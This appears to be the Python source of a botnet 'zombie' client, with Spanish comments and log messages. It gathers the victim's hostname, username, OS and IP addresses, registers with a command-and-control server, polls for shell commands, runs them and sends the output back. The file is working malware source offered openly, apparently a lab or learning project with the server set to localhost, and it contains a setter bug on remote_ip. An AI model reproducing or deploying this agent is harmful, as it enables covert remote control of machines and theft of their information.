
import sys
import json
import time
import requests

import utils.data as tools_data
import utils.logger as logger
import utils.commands as cmd


# CONSTANTS

HOST = "127.0.0.1"

PORT = 5000

URL_API_BOT = f"http://{HOST}:{PORT}/api/bot" 

DEBUG = True

TIME_RECONNECT = 5

TIME_BEFORE_DELETE_COMMAND = 1

# LOGIC

class Bot:

    def __init__(self):

        # Bot data

        self._uuid = None
        self._hostname = None
        self._username = None
        self._os = None
        self._remote_ip = None
        self._local_ip = None
        self._state = None
        self._location = None

    @property
    def uuid(self):
        return self._uuid

    @uuid.setter
    def uuid(self, uuid):
        self._uuid = uuid

    @property
    def hostname(self):
        return self._hostname

    @hostname.setter
    def hostname(self, hostname):
        self._hostname = hostname

    @property
    def username(self):
        return self._username

    @username.setter
    def username(self, username):
        self._username = username

    @property
    def os(self):
        return self._os

    @os.setter
    def os(self, os):
        self._os = os

    @property
    def remote_ip(self):
        return self._remote_ip

    @uuid.setter
    def remote_ip(self, remote_ip):
        self._remote_ip = remote_ip

    @property
    def local_ip(self):
        return self._local_ip

    @local_ip.setter
    def local_ip(self, local_ip):
        self._local_ip = local_ip

    @property
    def state(self):
        return self._state

    @state.setter
    def state(self, state):
        self._state = state

    @property
    def location(self):
        return self._location

    @location.setter
    def location(self, location):
        self._location = location

    # ----------- Connection Methods -----------

    def create_connection(self, data):

        headers = {'Content-type': 'application/json'}

        response = requests.post(f"{URL_API_BOT}", data=json.dumps(data), headers=headers).json()
        
        return response["success"]

    def update_connection(self, data):

        headers = {'Content-type': 'application/json'}

        response = requests.put(f"{URL_API_BOT}/{self._uuid}", data=json.dumps(data), headers=headers).json()

        return response["success"]

    # ----------- Commands Methods -----------

    def get_command(self):

        response = requests.get(f"{URL_API_BOT}/{self._uuid}/command").json()

        if response:

            return response["line"]

    def send_output(self, output):

        headers = {'Content-type': 'application/json'}

        payload = { "output": output }

        response = requests.put(f"{URL_API_BOT}/{self._uuid}/command", data=json.dumps(payload), headers=headers).json()

        return response["success"]

    def delete_command(self):

        response = requests.delete(f"{URL_API_BOT}/{self._uuid}/command").json()

        return response["success"]  


def load_data(zombie):

    zombie.uuid = tools_data.get_uuid()
    zombie.hostname = tools_data.get_hostname()
    zombie.username = tools_data.get_username()
    zombie.os = tools_data.get_platform()
    zombie.remote_ip = tools_data.get_remote_ip()
    zombie.local_ip = tools_data.get_local_ip()
    zombie.state = "Online"
    zombie.location = "Argentina"

def build_payload(zombie):

    return {

        "uuid": zombie.uuid,
        "hostname": zombie.hostname,
        "username": zombie.username,
        "os": zombie.os,
        "remote_ip": zombie.remote_ip,
        "local_ip": zombie.local_ip,
        "state": zombie.state,
        "location": zombie.location

    }


if __name__ == '__main__':
    
    zombie = Bot()

    active_zombie = True

    try:

        while active_zombie:

            try:

                load_data(zombie)

                payload = build_payload(zombie)

                if not zombie.create_connection(payload):

                    if DEBUG:

                        logger.log("Zombie ya existe. Se actualizará la información...", "warning")

                    if zombie.update_connection(payload):

                        if DEBUG:

                            logger.log("Información actualizada", "success")

                    else:

                        if DEBUG:

                            logger.log("Información no se pudo actualizar", "error")

                    cmdline = zombie.get_command()

                    if cmdline:

                        if DEBUG:

                            logger.log(f"Ejecutando comando: {cmdline}", "processing")

                        output = ""

                        if cmdline == "exit":

                            output += "exit"

                            active_zombie = False

                        else:

                            output += cmd.get_output(cmdline)

                        if zombie.send_output(output):

                            if DEBUG:

                                logger.log("Salida enviada con éxito", "success")

                        else:

                            if DEBUG:
                                
                                logger.log("No se ha podido enviar la salida", "error")

                        time.sleep(TIME_BEFORE_DELETE_COMMAND)

                        if zombie.delete_command():

                            if DEBUG:

                                logger.log("Último comando borrado con éxito", "success")

                        else:

                            if DEBUG:
                                
                                logger.log("No se ha podido borrar el comando", "error")

                else:

                    if DEBUG:

                        logger.log("Zombie creado con éxito", "success")

            except requests.exceptions.ConnectionError as error:

                print("Ha ocurrido un error en el servidor de C&C, intentando reconectar...")

                time.sleep(TIME_RECONNECT)



    except KeyboardInterrupt as error:

        print("Ha salido del zombie")